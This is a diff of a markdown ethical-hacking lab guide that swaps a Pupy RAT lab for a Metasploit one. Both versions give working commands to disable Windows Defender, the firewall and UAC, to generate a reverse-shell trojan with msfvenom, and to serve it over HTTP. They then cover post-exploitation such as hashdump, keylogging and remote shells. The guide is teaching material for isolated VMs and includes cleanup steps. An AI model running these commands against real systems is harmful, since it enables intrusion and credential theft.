@@ -1,273 +1,248 @@
-# Malware
+# Penetration Test
 
-The cross-platform and multi-function **RAT (Remote Access Trojan)**, can be a valuable exercise for penetration testers, researchers, and security enthusiasts. Like other hacking tools, **Pupy** is designed for post-exploitation activities, allowing you to control target machines once a foothold is established. Setting up a controlled environment for testing Pupy requires adhering to strict ethical standards and ensuring that testing is conducted in a legal and isolated setting.
+In this lab, we will set up a penetration testing environment where Parrot Linux serves as the attacker machine, and a Windows VM is the target. We'll use the Metasploit Framework to exploit the Windows VM by generating a Trojan, transferring it to the target, and performing post-exploitation tasks.
 
-### **What is Pupy?**
-- **Pupy** is an open-source, cross-platform RAT designed for post-exploitation purposes. It supports Windows, Linux, macOS, and Android.
-- It enables attackers to execute commands remotely, steal data, or control systems in various ways.
-- It is often used in controlled environments to simulate attacks and improve security defenses.
+- **Penetration Testing Environment**
+- **Parrot Linux (Attacker VM)**:
+  - Install Parrot Security OS, which comes pre-installed with the Metasploit Framework.
+- **Windows (Target VM)**:
+  - Use Windows Server 2019 or 2022, or Windows 10 or 11 as the target. Ensure it has vulnerable software or weak defenses (e.g., disabled antivirus, outdated patches).
 
-### **Goals of the Ethical Hacking Lab:**
-- Simulate a real-world scenario where a system can be compromised, and Pupy is used for post-exploitation.
-- Learn how to set up and use Pupy in a controlled, ethical environment.
-- Ensure that the lab is isolated and has no connection to external networks to avoid unintentional malicious use.
+- The two VMs are connected in the same NAT Networks. 
 
 ---
 
-### Task 1: **Set Up The Isolation For Virtual Machines**
+### **Task 1: Disable Windows Protection**
+To simulate vulnerable environments during a penetration testing lab, it is often necessary to disable Windows security features such as 
+- Firewall, 
+- Internet Explorer Enhanced Security Configuration (ESC), 
+- and Windows Defender.
 
-In a safe ethical hacking environment, you'll want to use **Virtual Machines (VMs)** to isolate the attacker and victim environments. Tools like **VirtualBox** or **VMware** are ideal for this purpose.
+- ⚠️ All methods with PowerShell are optional, for reference only.
 
-- **VM 1 (Attacker Machine)**: `Parrot OS`. It is pre-configured for penetration testing and include various tools needed for ethical hacking.
-- **VM 2 (Victim Machine)**: `Windows`. It is the most popular operating system for personal computers.
 
-- Create a VirtualBox `Internal Network`, then connect your attacker VM and victim vm to it.
-  - 🖥️ Internal network
-  - 🖥️ Parrot connected to the internal network
-  - 🖥️ Windows connected to the internal network
-  - 🖥️ Make sure Windows can ping Parrot
+#### **1. Disable Windows Firewall**
+Windows Firewall can block incoming connections or certain types of traffic, so disabling it allows for unrestricted network communication during penetration testing.
 
-- 👉 If you can't access Windows network setting GUI, you may open an Administrator PowerShell then access with commands:
-  ```powershell
-  # 1. directly open the Network Connections control panel
-  control ncpa.cpl
-  # OR, 2. open the broader Network and Sharing Center
-  control netcenter
-  # OR, 3. To open the Internet Options control panel:
-  control inetcpl.cpl
-  # OR, 4. open the Network and Sharing Center directly:
-  control.exe /name Microsoft.NetworkAndSharingCenter
-  ```
-- 👉 Configure Parrot network through shell commands:
-  ```bash
-  # 1. identify your network interface name:
-  ip link show # enp0s3, eth0: possible names for physical network interface
-  # ⚠️ change <if> to your network interface name
-  # 2. Set the IP address and subnet mask:
-  sudo ip addr add 192.168.1.100/24 dev <if>
-  # verify
-  ip addr show eth0
-  # 3. Bring the interface up
-  sudo ip link set <if> up
-  # 4. Set the default route (gateway):
-  sudo ip route add default via 192.168.1.1
-  # verify
-  ip route show
-  # 5. Set DNS servers:
-  sudo nano /etc/resolv.conf
-  # add two lines below without #
-  # nameserver 8.8.8.8
-  # nameserver 8.8.4.4
+##### **Method 1: Using GUI (Windows Defender Firewall)**
+1. Open the **Control Panel** → **System and Security** → **Windows Defender Firewall**.
+2. Click **Turn Windows Defender Firewall on or off** from the left pane.
+3. For both **Private network settings** and **Public network settings**, choose **Turn off Windows Defender Firewall**.
+4. Click **OK** to apply the changes.
 
-  # verify
-  cat /etc/resolv.conf
-  ```
-  - For persistent configuration, save settings in /etc/netplan/01-netcfg.yaml as below:
-    - Just for reference, not recommended.
-  ```
-  network:
-    ethernets:
-      <if>:
-        addresses:
-          - 192.168.1.100/24
-        gateway4: 192.168.1.1
-        nameservers:
-          addresses: [8.8.8.8, 8.8.4.4]
-  version: 2  
-  ```
+- 💻 Disabled Windows Firewall
 
-#### [VirtualBox networking modes](https://www.virtualbox.org/manual/ch06.html)
+##### **Optional Method 2: Using PowerShell**
+1. Open PowerShell with Administrator privileges.
+2. Run the following command to disable the firewall for all profiles (Domain, Public, Private):
+   ```powershell
+   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+   ```
+3. To verify the firewall is disabled, use the following command:
+   ```powershell
+   Get-NetFirewallProfile
+   ```
+   This will display the status of the firewall for each profile.
 
-| Network Type       | VM to VM Communication | Host to VM Communication | External Network Access | Best Use Case                      |
-|--------------------|-----------------------|--------------------------|-------------------------|-------------------------------------|
-| NAT                | No                    | Yes                      | Yes                     | Basic internet access               |
-| NAT Network        | Yes                   | Yes                      | Yes                     | VMs need to talk to each other and the internet |
-| Bridged Adapter    | Yes                   | Yes                      | Yes                     | Accessible from the local network   |
-| Host-Only Adapter   | Yes                   | Yes                      | No                      | Isolated testing environment        |
-| `Internal Network `  | Yes                   | No                       | No                      | Secure, isolated environments        |
-| Generic Driver     | Depends on setup      | Depends on setup         | Depends on setup        | Custom networking configurations     |
 
-#### Choosing the Right Mode
+### **2. Disable Internet Explorer Enhanced Security Configuration (ESC)**
+Internet Explorer Enhanced Security Configuration (ESC) restricts browser activity, which can interfere with downloading files or interacting with external websites during testing.
 
-The right network mode for your VirtualBox environment depends on your specific use case:
+#### **Method 1: Using Server Manager**
+1. Open **Server Manager**.
+2. Click **Local Server** in the left panel.
+3. In the **Properties** section, locate **IE Enhanced Security Configuration**.
+4. Click **On**, and a dialog box will appear.
+5. Set **Administrators** and **Users** to **Off**.
+6. Click **OK** to apply the changes.
 
-- For **testing and development** where you want isolation (e.g., ethical hacking labs), **Host-Only** or **Internal Network** is preferred.
-- If your VMs need to **access the internet**, consider using **NAT** or **NAT Network**.
-- If you need to expose services to your **local network**, go with the **Bridged Adapter**.
+- 💻 Disabled IE ESC
+
+#### **Optional Method 2: Using PowerShell**
+1. Open PowerShell as Administrator.
+2. Run the following command to disable ESC for administrators and users:
+   ```powershell
+   $AdminKey = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{AECB2FD8-3B02-11D3-BF9A-00C04F79EFBC}"
+   Set-ItemProperty -Path $AdminKey -Name "IsInstalled" -Value 0
+   ```
+   This will disable Enhanced Security for both administrators and standard users.
+
+### **3. Disable Windows Defender**
+Windows Defender (also known as Microsoft Defender) actively scans for malware and may block exploits or malware-based payloads. Disabling it during penetration testing may be necessary to simulate a vulnerable environment.
+
+
+#### **Method 1: Using Windows Security Settings**
+1. Open **Windows Security** from the Start menu.
+2. Go to **Virus & threat protection**.
+3. Under **Virus & threat protection settings**, click **Manage settings**.
+4. Turn **Real-time protection** off.
+5. Also, turn off **Cloud-delivered protection** and **Automatic sample submission** for full disablement.
+
+- 💻 Disabled Windows Defender
+
+#### **Optional Method 2: Using Group Policy (GPO)**
+1. Open the **Group Policy Editor** by typing `gpedit.msc` in the search bar and pressing **Enter**.
+2. Navigate to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Microsoft Defender Antivirus**.
+3. In the right pane, double-click **Turn off Microsoft Defender Antivirus**.
+4. Set it to **Enabled**, then click **OK** to apply the changes.
+
+   To disable real-time protection:
+   - Go to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Microsoft Defender Antivirus** → **Real-time Protection**.
+   - Disable the options like **Turn off real-time protection**, **Turn off behavior monitoring**, and **Turn off monitoring for incoming files and attachments**.
+
+#### **Optional Method 3: Using PowerShell**
+1. Open PowerShell as Administrator.
+2. Run the following commands to turn off **Real-Time Protection**:
+   ```powershell
+   Set-MpPreference -DisableRealtimeMonitoring $true
+   ```
+3. You can also disable other Defender features like **Cloud Protection** and **Automatic Sample Submission**:
+   ```powershell
+   Set-MpPreference -DisableBehaviorMonitoring $true
+   Set-MpPreference -DisableBlockAtFirstSeen $true
+   Set-MpPreference -DisableIOAVProtection $true
+   Set-MpPreference -DisableArchiveScanning $true
+   ```
+
+### **4. Disable User Account Control (UAC)**
+To reduce pop-up warnings during testing, you may also want to disable **User Account Control (UAC)**, which can prompt for confirmation when executing programs.
+
+#### **Method 1: Using Control Panel**
+1. Open **Control Panel**.
+2. Go to **User Accounts** → **Change User Account Control settings**.
+3. Move the slider down to **Never notify**, then click **OK**.
+
+- 💻 Disabled UAC
+
+#### **Optional Method 2: Using PowerShell**
+1. Open PowerShell as Administrator.
+2. Run the following command:
+   ```powershell
+   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+   ```
+3. Restart the server for the changes to take effect.
 
 ---
 
-### Task 2: **Install Pupy on the Attacker Machine**
+### **Task 2: Generate a Trojan in Parrot Linux (Reverse Shell Payload)**
+The Trojan we'll create will be a `reverse shell`, which will allow the Parrot Linux VM to gain control of the Windows VM.
 
-On your attacker machine, if **Pupy** is not preinstalled, you'll install it, then configure it to generate payloads and control compromised systems.
-
-- **Pupy RAT** source code from its official repository: [Pupy GitHub](https://github.com/n1nj4sec/pupy).
-- Connect Parrot to NAT Network for this installation temporarily.
-  - Reconnect to the Internal Network after installation.
-
-#### **Steps to Install Pupy:**
-- **Method 1: Local installation**
-1. **Clone the Pupy GitHub Repository:**
-   Open a terminal and run the following commands:
+1. Open Metasploit in Parrot Linux:
    ```bash
-   git clone https://github.com/n1nj4sec/pupy.git
-   # or download the archive from: https://github.com/n1nj4sec/pupy/tags
-   # then unzip it
-   cd pupy
+   msfconsole
    ```
-
-2. **Install Dependencies:**
-   Pupy has various dependencies, which you need to install:
+2. Generate a Windows executable payload:
    ```bash
-   sudo apt-get update
-   sudo apt-get install python-pip python-dev build-essential
-   pip install -r requirements.txt
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Parrot_VM_IP> LPORT=4444 -f exe -o /root/trojan.exe
    ```
+   Replace `<Parrot_VM_IP>` with the IP address of the Parrot Linux VM (you can find this using the `ifconfig` command). The `LPORT` is the port that will listen for incoming connections from the Windows VM.
 
-3. **Install PyInstaller (for payload generation):**
-   Pupy uses PyInstaller to create executables. Install it using:
+- 💻 Generation and the generated trojan
+
+### **Task 3: Transfer the Trojan to the Windows VM**
+There are several ways to transfer the generated Trojan (`trojan.exe`) to the Windows VM:
+
+#### Method 1: **Python HTTP Server (Recommended)**
+1. Start a simple HTTP server on Parrot Linux to serve the Trojan file:
    ```bash
-   pip install pyinstaller
+   cd folder_contains_the_trojan
+   python3 -m http.server 8080
    ```
-
-4. **Start the Pupy Server:**
-   Once all dependencies are installed, start the **Pupy** server, which will handle incoming connections from the compromised machines:
-   ```bash
-   python pupysh.py
+2. On the Windows VM, open a web browser and download the Trojan by navigating to:
    ```
+   http://<Parrot_VM_IP>:8080/trojan.exe
+   ```
+3. Save the file to the Windows machine.
 
-   This will start the Pupy interactive shell where you can generate payloads and manage compromised systems.
+- 💻 trojan.exe on the webpage and in the download folder
 
-- **Method 2: Docker (suggested)**
-  - Install docker
-  - [Pull then use Pupy docker image](https://github.com/n1nj4sec/pupy/tree/unstable)
-
-    ```bash
-    # 1. Pull Image
-    docker image pull cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892
-    # 2. Tag image
-    docker tag cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892 docker-pupy
-    # 3. Run Image 
-    docker run --rm -it -p 1234:1234 docker-pupy python pupysh.py
-    # OR, mount a host folder where you have all your payloads
-    docker run --rm -it -p 1234:1234 -v "/opt/payloads:/tmp/payloads" docker-pupy python pupysh.py
-    ```
-
-- 💻 Pupy interactive shell
+#### Optional Method 2: **Shared Folder**
+- Set up a shared folder between the Parrot Linux and Windows VMs in VirtualBox settings to transfer the file.
 
 ---
 
-### Task 3: **Generate Pupy Payload**
+### **Task 4: Set Up a Listener on Parrot Linux (Reverse Shell Handler)**
+Before executing the Trojan, we need to set up Metasploit to listen for the connection from the Windows VM:
 
-After setting up the **Pupy server**, you will need to generate a payload that can be executed on the **victim machine**.
-
-#### **Steps to Generate Payloads:**
-
-1. **Choose the Type of Payload**:
-   You can create payloads for Windows the platform of the victim machine.
-
-   Generating a **Windows executable payload**:
+1. In the `Metasploit console` on Parrot Linux, set up the multi-handler:
    ```bash
-   gen -f exe_x64 connect --host <attacker_ip>:<port>
-   # example: gen -f exe_x64 connect --host 192.168.1.100:8888
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_tcp
+   set LHOST <Parrot_VM_IP>
+   set LPORT 4444
+   exploit
    ```
+2. Execute the Trojan on the Windows VM
+   1. On the Windows VM, navigate to where the `trojan.exe` file was downloaded.
+   2. Run the `trojan.exe` file. This will initiate a connection back to the Parrot Linux VM.
+3. When the Trojan is executed on the Windows VM, you should see a successful connection established in Metasploit, resulting in a Meterpreter session.
 
-   This will create a payload that connects back to your **Pupy** server at `<attacker_ip>:<port>`.
+- 💻 the Meterpreter session
 
-- 💻 the payload
-
-2. **Transfer Payload to Victim**:
-   Use a method (like file sharing) to transfer the payload to the victim machine, or HTTP:
-
-   - On the attacker VM, start a simple HTTP server in the folder contains the payload:
-     ```shell
-     python3 -m http.server 8080
-     ```
-    - 💻 the running HTTP server
-  - On the victim VM, access the simple HTTP server from a browser. Type the following URL in its address box:
-    - `http://your_parrot_ip:8080`
-    - then download the payload
-    - 💻 the payload on the webpage
-
----
-
-### Task 4: **Set Up the Victim Machine**
-
-On the **victim machine** (the VM you are targeting), ensure the following:
-   
-1. **Disable IE security, Firewall, and Antivirus (for testing purposes)**:
-   - If using a Windows VM, disable any antivirus to prevent the payload from being immediately blocked.
-   - From the Server Manager, turn off `IE Enhanced Security` and `firewall`
-     - 💻 show both configurations are off
-   - Turn off Windows Defender
-     - Use Group Policy Editor (gpedit.msc)
-     - Navigate to Computer Configuration > Administrative Templates > Windows Components > Windows Defender Antivirus
-     - Set "Turn off Windows Defender Antivirus" to "Enabled"
-     - Open an Administrator Powershell to apply the update
-       ```powershell
-       gpupdate /force
-       ``` 
-     - 💻 show Windows Defender is turned off
-
-2. **Execute the Payload**:
-   - Once transferred, execute the Pupy payload on the victim machine.
-   - 💻 the running Puppy payload
-
----
-
-### Task 5: **Establish a Connection with Pupy**
-
-Once the payload is executed on the victim machine, the **Pupy server** running on the attacker machine should receive a connection.
-
-1. **Monitor Incoming Connections**:
-   From your **Pupy shell** on the attacker machine, you should see an active session once the victim machine is compromised.
-   
-   Example of listing connected clients:
+### **Task 5: Post-Exploitation of the Windows VM**
+Once the Meterpreter session is active, you can perform various post-exploitation tasks:
+1. **Check Active Sessions**:
    ```bash
    sessions
    ```
+2. **Interact with a Session**:
+   ```bash
+   sessions -i <session_id>
+   ```
    - 💻 the connected clients
-
-2. **Interacting with the Victim Machine**:
-   You can interact with the victim machine by using various **Pupy modules** and commands for remote control. Examples include:
+3. **Common Post-Exploitation Commands**:
+   - **Get system information**:
+     ```bash
+     sysinfo
+     ```
+   - **List processes**:
+     ```bash
+     ps
+     ```
+   - **Dump Windows password hashes**:
+     ```bash
+     hashdump
+     ```
+   - **Capture screenshots**:
+     ```bash
+     screenshot
+     ```
    - **Keylogging**:
      ```bash
-     run keylogger
+     keyscan_start
+     keyscan_dump
      ```
-   - **Screenshot Capture**:
+   - **Upload/Download files**:
      ```bash
-     run screenshot
+     download <file>
+     upload <local_path> <remote_path>
      ```
-   - **Remote Shell Access**:
+   - **Open a shell on the target system**:
      ```bash
      shell
+
+     # exit the remote shell just opened
+     exit
      ```
-
-   Explore the various modules and capabilities of Pupy for ethical research purposes.
-   - 💻 keylogger
-   - 💻 screenshot of the victim VM from the attacker
-   - 💻 remote shell
+- 💻 Results of all the commands above
 
 
-### Task 6: **Decommission the Lab**
+### **Task 6: Clean Up**
+After your test, remember to clean up the target system:
+1. Remove the Trojan file from the Windows VM.
+2. Restore security protection on Windows VM:
+   1. 🖥️ Turn on IE enhanced security and firewall.
+   2. 🖥️ Turn on Windows Defender and UAC
+3. Shut down the virtual machines to prevent any unintended damage or data loss.
 
-Once your testing is complete:
-- **Delete any payloads** and malicious files.
-- **Restore the victim machines**
-  - 🖥️ Turn on IE enhanced security and firewall.
-  - 🖥️ Turn on Windows Defender
 
----
+### **Conclusion**
+This lab demonstrates how to set up a penetration testing environment using VirtualBox with Parrot Linux and Metasploit Framework to exploit a Windows machine. You can expand this lab by introducing more advanced exploits, securing the network, or testing against more complex targets.
 
-### **Security Considerations**:
-
-- **Ethical Testing Only**: Never use Pupy or any other RAT outside of a controlled environment without explicit permission.
-- **Isolate the Lab**: Keep your virtual machines and payloads isolated from any real-world networks.
-- **Monitor for Malicious Code**: Use tools like **Wireshark** to ensure no unintended data leakage occurs from your test environment.
-
+- ⚠️ **Ethical Testing Only**: Never use Metasploit outside of a controlled environment without explicit permission.
 
 # References
-- [Pupy](https://github.com/n1nj4sec/pupy)
+- [Metasploit Unleashed - Free Online Ethical Hacking Course](https://www.offsec.com/metasploit-unleashed/)
 - [PracticalMalwareAnalysis-Labs](https://github.com/mikesiko/PracticalMalwareAnalysis-Labs)
   - [Book](https://nostarch.com/malware)
   - [Class 2019](https://samsclass.info/126/126_F19.shtml)
